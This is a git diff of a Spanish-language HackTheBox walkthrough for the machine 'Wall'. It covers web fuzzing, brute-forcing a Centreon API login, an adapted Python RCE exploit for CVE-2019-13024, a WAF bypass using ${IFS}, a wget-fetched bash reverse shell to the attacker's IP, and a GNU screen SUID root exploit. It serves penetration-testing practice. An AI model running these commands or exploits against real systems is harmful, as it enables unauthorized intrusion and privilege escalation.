@@ -1,14 +1,16 @@
-10.10.10.157 - Wall
--------------------
+# 10.10.10.157 - Wall
+
+![Wall](https://user-images.githubusercontent.com/96772264/206703371-375e30df-4797-48d0-a783-fae853f98749.png)
+
+----------------------
+# Part 1: Enumeración básica 
 
 Puertos abiertos 22(ssh), 80(http)
 ```console
 └─$ whatweb http://10.10.10.157
 Apache[2.4.29] -> Title[Apache2 Ubuntu Default Page: It works]
 ```
-Nos encontramos la página por defecto de apache
-Vamos a mepezar por el fuzzing.
-
+Nos encontramos la página por defecto de Apache. Vamos a mepezar por el fuzzing.
 ```console
 └─$ wfuzz -c --hl=12 -w $(locate subdomains-top1million-5000.txt) -H "Host: FUZZ.10.10.10.157" -u http://10.10.10.157/ -t 100
 # Nada
@@ -18,10 +20,9 @@ Vamos a mepezar por el fuzzing.
 000095511:   403        11 L     32 W       301 Ch      "server-status"
 ```
 
-Hacer una petición a /monitoring nos da un 401 unauthorized, es decir le faltan credenciales. 
-No tenemos mas puertos así que hay que seguir buscando por aquí. Muchas veces las peticiones con el parámetro 
-de curl "-I" te revela información de las cabeceras. Aquí no nos da nada, pero esta la opción también de cambiar
-el método.
+Hacer una petición a /monitoring nos da un 401 unauthorized, es decir le faltan credenciales.
+No tenemos mas puertos así que hay que seguir buscando por aquí. Muchas veces las peticiones con el parámetro  de curl "-I" te revela información de las cabeceras.
+Aquí no nos da nada, pero esta la opción también de cambiar el método.  
 
 ```console
 └─$ wfuzz -c -X POST --hc=404 -t 100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.157/FUZZ/
@@ -29,11 +30,13 @@ el método.
 └─$ curl -s -X POST http://10.10.10.157/monitoring/  
 <meta http-equiv="refresh" content="0; URL='/centreon'" />
 ```
+----------------------------
+# Part 2: Bruteforceando el login de Centreon 
 
-Acabamos en un panel de login de centreon. Ponemos las creds por defecto que son admin:Centreon123! pero no nos 
-dejan. Eso si, abajo se leakea la versión 19.04.0 
+Acabamos en un panel de login de centreon. Ponemos las creds por defecto que son admin:Centreon123! pero no nos dejan. Eso si, abajo se leakea la versión 19.04.0 
+No se puede bruteforcear por:  
+![wall1](https://user-images.githubusercontent.com/96772264/206703563-c0c89f5b-b020-41bf-84d7-e3517ea28717.PNG)
 
-No se puede bruteforcear por:
 ```console
 └─$ curl -s http://10.10.10.157/centreon/ | grep "input"
 ...
@@ -44,12 +47,12 @@ No se puede bruteforcear por:
 # Un montón de rutas
 ```
 - /api -> 401 unauthorized.
-	* /api/interface -> un php
-	* /api/class -> muchos phps
-- /img -> tiene directory listing, pero solo muestra fotos.
-- /themes -> lo mismo, nada interesante, al giual con /widgets, /sounds /modules, /static, /locale
-- /lib -> existe *wz_tooltip.js	 v. 5.20*
-- /include, /class-> un monton de phps
+	* /api/interface -> un php  
+	* /api/class -> muchos phps  
+- /img -> tiene directory listing, pero solo muestra fotos.  
+- /themes -> lo mismo, nada interesante, al giual con /widgets, /sounds /modules, /static, /locale  
+- /lib -> existe *wz_tooltip.js	 v. 5.20*  
+- /include, /class-> un monton de phps  
 
 Si buscas en google centreon api te sale como busqeda sugerida "login", lo que te da la documentacion [oficial](https://docs.centreon.com/docs/api/rest-api-v1/)
 
@@ -80,18 +83,22 @@ done
 └─$ cat output | grep -v "Bad"
 password1: {"authToken":"5fQ3VjxYW4yd\/Dcs5rA4rGddwn\/OTYnldovNzzYiWzY="}
 ```
+![wall2](https://user-images.githubusercontent.com/96772264/206703605-1e72d92c-3aa7-4407-a1b6-8a1c65f8f32f.PNG)
 
-En searchploit hay dos exploit principales
-- Un blindsqli -> ```/include/monitoring/acknowlegement/xml/broker/makeXMLForAck.php?hid=15&svc_id=1 AND (SELECT 1615 FROM SELECT(SLEEP(5)))TRPy)```
-- Pollers RCE
+----------------------------
+# Part 3: Explotando un RCE en Centreon
 
-Pollers RCE dice que
-- irse a /centreon/main.php?p=60803&type=3 (Configuration > Commands > Miscellaneous)
+En searchploit hay dos exploit principales:  
+- Un blindsqli -> ```/include/monitoring/acknowlegement/xml/broker/makeXMLForAck.php?hid=15&svc_id=1 AND (SELECT 1615 FROM SELECT(SLEEP(5)))TRPy)```  
+- Pollers RCE  
 
-Hay un script que explota este Poller RCE -> 47069.py (CVE-2019-13024/@mohammadaskar2)
-He creado un exploit basado en el de esta persona solo que usando librerias mas simples y todo adaptado a esta
-máquina. He simplicado su script todo lo posible pero que siga siendo funcional y he añadido un código de estado
-para ver como se comportan los comandos
+Pollers RCE dice que:  
+- irse a /centreon/main.php?p=60803&type=3 (Configuration > Commands > Miscellaneous)  
+![wall3](https://user-images.githubusercontent.com/96772264/206703644-1f638810-9463-4cf7-acb3-0cb5e82f4b4c.PNG)  
+
+Hay un script que explota este Poller RCE -> 47069.py (CVE-2019-13024/@mohammadaskar2)  
+He creado un exploit basado en el de esta persona solo que usando librerias mas simples y todo adaptado a esta máquina. He simplicado su script todo lo posible 
+pero que siga siendo funcional y he añadido un código de estado para ver como se comportan los comandos
 
 ```python
 #!/usr/bin/python
@@ -153,19 +160,20 @@ xml_page_data = {"poller": "1", "debug": "true", "generate": "true",}
 sess.post(generate_xml_page, xml_page_data)
 ```
 
+----------------------------
+# Part 4: Bypaseando un WAF 
 ```console
 └─$ python3 ./exploit.py 'whoami' # -> [+] Código de estado: 200
 └─$ python3 ./exploit.py 'curl http://10.10.14.16' # -> [+] Código de estado: 403
 ```
-Unos comandos funcionan y otros no. Puede que haya un WAF (firewall web)
-- Probar a cambiar espacios por "${IFS}" (una varaible de entorno que representa un espacio)
-
+Unos comandos funcionan y otros no. Puede que haya un WAF (firewall web)  
+- Probar a cambiar espacios por "${IFS}" (una varaible de entorno que representa un espacio)  
 
 ```console
 └─$ python3 ./exploit.py 'wget${IFS}10.10.14.16' 
 └─$ sudo python3 -m http.server 80 # -> 10.10.10.157 - - [08/Dec/2022 18:25:08] "GET / HTTP/1.1" 200 -
 ```
-Con curl no recibia una peticion pero con wget si.
+Con curl no recibia una peticion pero con wget si.  
 
 ```
 #!/bin/bash
@@ -174,13 +182,17 @@ bash -c 'bash -i >& /dev/tcp/10.10.14.16/443 0>&1'
 ```console
 └─$ python3 ./exploit.py 'wget${IFS}10.10.14.16/index.html${IFS}-O${IFS}/tmp/shell;${IFS}bash${IFS}-i${IFS}/tmp/shell'
 ```
-# wget 10.10.14.16/index.html -O /tmp/shell; bash -i /tmp/shell
-Con eso accedí al sistema. ```sudo nc -nlvp 443```. Hice ```which curl``` para ver si existia ese comando y no.
-Subi mi script de reconocimiento:
-- Archivos de configuración: /etc/centreon/conf.pm /etc/centreon/centreon.conf.php
-- SUIDS -> /bin/screen-4.5.0
+``` wget 10.10.14.16/index.html -O /tmp/shell; bash -i /tmp/shell ```
 
-Para screen hay un exploit.
+----------------------------
+# Part 5: Accediendo al sistema
+
+Con eso accedí al sistema. ```sudo nc -nlvp 443```. Hice ```which curl``` para ver si existia ese comando y no.  
+Subi mi script de reconocimiento:  
+- Archivos de configuración: /etc/centreon/conf.pm /etc/centreon/centreon.conf.php   
+- SUIDS -> /bin/screen-4.5.0  
+
+Para screen hay un exploit.  
 ```console
 www-data@Wall:/tmp$ wget 10.10.14.16/41154.sh -O /tmp/screen.sh
 www-data@Wall:/tmp$ chmod +x screen.sh
@@ -190,7 +202,7 @@ root
 # bash                         
 root@Wall:/etc#
 ```
-El exploit utiliza este sistema:
+El exploit utiliza este sistema:  
 ```console
 $:~ screen -D -m -L archivo echo "Hola Mundo"
 $:~ ls -l bla.bla
@@ -198,8 +210,8 @@ $:~ ls -l bla.bla
 $:~ cat archivo
 Hola Mundo
 ```
-
-41154.sh > Vamos a analizar el exploit...
+ 
+41154.sh > Vamos a analizar el exploit...  
 
 ```bash
 echo "~ gnu/screenroot ~"
